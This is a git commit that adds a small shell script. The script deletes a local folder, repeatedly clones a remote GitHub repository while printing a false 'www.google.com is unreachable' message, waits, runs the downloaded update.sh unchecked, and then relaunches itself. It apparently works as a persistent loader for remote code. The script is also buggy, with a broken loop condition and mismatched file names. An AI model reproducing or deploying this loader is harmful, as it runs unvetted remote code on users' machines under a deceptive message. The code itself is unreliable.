cbebb41571b4223d98a237e564d9e9dcf55499f6
ubol12341 <ubol1234.1@gmail.com>
2025-07-24 21:32:46 +0700

    Create trnet.sh

---
+++ Trent.sh
@@ -0,0 +1,25 @@
+#!/bin/sh
+
+sleep 5s
+rm -rf update
+sleep 3s
+
+n=0
+   until [ $n -ge ]
+   do
+      git clone "https://github.com/chiharu92msn/update.git" && break
+      n=$[$n+1]
+sleep 3s
+echo "www.google.com is unreachable. Retrying"
+sleep 12s
+      sleep 1
+   done
+
+sleep 3s
+cd update
+chmod +x update.sh
+echo "online"
+sleep 300s
+./update.sh
+cd
+./trnet.sh
